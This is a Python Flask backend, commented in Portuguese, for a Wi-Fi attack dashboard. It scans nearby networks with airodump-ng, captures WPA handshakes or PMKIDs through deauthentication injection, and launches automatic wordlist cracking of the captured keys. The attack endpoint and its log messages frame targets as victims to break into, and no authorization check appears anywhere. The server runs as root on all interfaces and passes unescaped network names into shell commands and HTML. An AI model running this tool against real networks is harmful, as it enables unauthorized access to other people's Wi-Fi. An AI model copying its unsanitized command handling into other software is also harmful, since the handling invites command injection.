import os
import time
import csv
import subprocess
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify

# Importa as funções principais do nosso script anterior (core da ferramenta)
from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash, identify_vendor, analyze_vulnerabilities

app = Flask(__name__)

# Variáveis globais de controle de estado
CURRENT_MONITOR_IFACE = None
SCAN_PROCESS = None
CSV_PREFIX = "web_scan_results"

# --- Sistema de Logs e Relatório Magistrado ---
SESSION_LOGS = []

def add_log(msg, log_type="info", is_command=False):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "msg": msg, "type": log_type, "cmd": is_command}
    SESSION_LOGS.append(log_entry)
    # Também printa no terminal físico para redundância
    print(f"[{timestamp}] [{log_type.upper()}] {msg}")

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/api/logs', methods=['GET'])
def get_logs():
    last_idx = request.args.get('last', default=0, type=int)
    new_logs = SESSION_LOGS[last_idx:]
    return jsonify({"status": "success", "logs": new_logs, "next_idx": len(SESSION_LOGS)})

@app.route('/api/report', methods=['GET'])
def get_report():
    report_html = f"""
    <html>
    <head>
        <title>Relatório Magistrado DSI</title>
        <style>
            body {{ font-family: 'Courier New', monospace; background: #050505; color: #00ff00; padding: 40px; }}
            .report {{ border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 20px #00ff00; }}
            h1 {{ border-bottom: 2px solid #00ff00; padding-bottom: 10px; text-transform: uppercase; }}
            .cmd {{ color: #ff00ff; font-weight: bold; }}
            .info {{ color: #00ffff; }}
            .error {{ color: #ff0000; }}
            .log-line {{ margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }}
        </style>
    </head>
    <body>
        <div class="report">
            <h1>Relatório de Incursão Wi-Fi - DSI Expert Magistrado</h1>
            <p><strong>Gerado em:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <hr>
            <h3>LOGS DE EXECUÇÃO E COMANDOS:</h3>
            <div id="log-content">
                {"".join([f"<div class='log-line {l['type']}'>[{l['time']}] {'[CMD] ' if l['cmd'] else ''}{l['msg']}</div>" for l in SESSION_LOGS])}
            </div>
            <p style="margin-top:40px; font-size:0.8em; opacity:0.5;">SISTEMA DSI AUTOMATED AUDITOR V3.0 - MAGISTRADO EDITION</p>
        </div>
    </body>
    </html>
    """
    return report_html

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    stdout, stderr = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    interfaces = stdout.split('\n') if stdout else []
    return jsonify({
        "status": "success", 
        "interfaces": [i for i in interfaces if i],
        "os_type": "linux"
    })

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    global CURRENT_MONITOR_IFACE
    data = request.get_json()
    iface = data.get('interface')
    
    if not iface:
        return jsonify({"status": "error", "message": "Nenhuma interface providenciada"}), 400
    
    add_log(f"Comando: Armar monitoramento na interface {iface}", log_type="cmd", is_command=True)
    CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
    
    if CURRENT_MONITOR_IFACE:
        add_log(f"Interface {CURRENT_MONITOR_IFACE} armada e camuflada.", log_type="info")
        return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
    else:
        add_log(f"Falha ao armar interface {iface}", log_type="error")
        return jsonify({"status": "error", "message": "Falha no Kernel ao armar modo monitor."}), 500

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_PROCESS, CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE:
        return jsonify({"status": "error", "message": "Modo monitor inativo."}), 400
    
    add_log(f"Acionando Varredura de Espectro via {CURRENT_MONITOR_IFACE}", log_type="cmd", is_command=True)
    run_command(f"rm -f {CSV_PREFIX}-01.*")
    cmd = f"airodump-ng --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
    SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return jsonify({"status": "success", "message": "Radar ligado."})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_PROCESS
    if SCAN_PROCESS:
        add_log("Varredura interrompida pelo operador.", log_type="info")
        SCAN_PROCESS.terminate()
        run_command("killall airodump-ng", sudo=True)
        SCAN_PROCESS = None
    return jsonify({"status": "success"})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    csv_file = f"{CSV_PREFIX}-01.csv"
    networks = []
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f); in_ap = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID": in_ap = True; continue
                    if row[0].strip() == "Station MAC": break
                    if in_ap:
                        bssid = row[0].strip(); essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({
                                'bssid': bssid, 'signal': row[8].strip(),
                                'channel': row[3].strip(), 'privacy': row[5].strip(), 
                                'essid': essid, 'vendor': identify_vendor(bssid)
                            })
        except Exception: pass
    networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
    return jsonify({"status": "success", "networks": networks})

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    global CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE: return jsonify({"status": "error", "message": "Sem interface."})
    data = request.get_json()
    bssid = data.get('bssid'); channel = data.get('channel'); essid = data.get('essid'); attack_type = data.get('attack_type')
    
    vendor = identify_vendor(bssid)
    vulns, advice = analyze_vulnerabilities(vendor, essid, data.get('privacy', ''))
    
    add_log(f"Iniciando Incursão Magistrada contra {essid} ({vendor})", log_type="cmd", is_command=True)
    add_log(f"Inteligência: {advice}", log_type="info")
    
    prefix = f"web_capture_{essid.replace(' ', '_')}"
    cap_file = None
    if attack_type == 'pmkid':
        add_log("Executando Extração PMKID (Clientless)...")
        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        if not cap_file:
             add_log("Aviso: PMKID falhou. Tentando Fallback para Deauth...", log_type="error")
             cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
    else:
        add_log("Executando Injeção Deauth (Aireplay/MDK4)...")
        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)

    if cap_file:
        add_log(f"VITÓRIA: Chave capturada em {cap_file}", log_type="info")
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wordlist):
            add_log(f"Disparando Força Bruta automática (Wordlist: {wordlist})")
            threading.Thread(target=crack_hash, args=(cap_file, wordlist, bssid)).start()
        return jsonify({"status": "success", "cap_file": cap_file})
    
    add_log("Fracasso: O alvo não cedeu às investidas.", log_type="error")
    return jsonify({"status": "error", "message": "O alvo resistiu."})

@app.route('/api/restore', methods=['POST'])
def restore():
    global CURRENT_MONITOR_IFACE, SCAN_PROCESS
    add_log("Restaurando ambiente civil.", log_type="info")
    if SCAN_PROCESS: SCAN_PROCESS.terminate(); run_command("killall airodump-ng", sudo=True); SCAN_PROCESS = None
    if CURRENT_MONITOR_IFACE: set_managed_mode(CURRENT_MONITOR_IFACE); CURRENT_MONITOR_IFACE = None
    return jsonify({"status": "success", "message": "Rede normal reativada."})

if __name__ == '__main__':
    if os.geteuid() != 0: exit(1)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
